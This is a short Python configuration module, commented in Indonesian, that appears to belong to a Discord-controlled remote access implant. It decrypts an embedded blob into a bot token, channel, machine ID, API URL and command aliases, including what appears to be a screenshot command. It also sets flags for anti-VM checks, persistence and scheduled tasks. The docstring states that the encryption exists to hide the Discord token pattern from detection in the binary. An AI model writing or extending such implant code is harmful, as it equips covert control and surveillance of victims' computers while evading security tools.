"""Generated 2026-10-29T23:53:39 â€” jangan diedit tangan.

Token, channel, dan base URL disimpan sebagai blob terenkripsi. Yang
muncul di binary cuma base64 acak, bukan pola token Discord.
"""

from ._crypt import open_blob

_K = b'\xc4"\xc4T\xf9W\xfe\xe2yM\x85\x02\x0c\x960\x8fE\x16\x9b\xde\xbf\xbcL\xe8\xe2k\xab^\xe7b\xbaz'

_B = "hXP/k5XjID1aIHcJhvOUAeuDi0pWV/NuqHDkSQPmuSwz4kuZt8Ahtpr5rYk6IIJ89DlANXFfSqpY5LkeMle3LfjgfFlWk89XXoIt89RmJtlszMoau6LtvTc8kiUiTK5L6xQN/ro86EjIDcmjRWrGaXg6LtYUIjT1rDQ44RuHV3AntN42bCuEd4FN1OPEIagI6UJZ1vn+DBMXuteOXwTAKXjWGrnZPoIewR+0BR+4wA+sYsU="

_f = open_blob(_B, _K)
TOKEN = _f[0]
CHANNEL = int(_f[1])
UUID = _f[2]
NAME = _f[3]
POLL = float(_f[4])
ANTI_VM = _f[5] == "1"
PERSIST = _f[6] == "1"
TASK = _f[7] == "1"
API = _f[8]
# Alias pendek: !a info, !b shot. Dipakai kalau mesinnya sudah banyak dan
# uuid8 nggak muat di kepala.
ALIAS = _f[9]
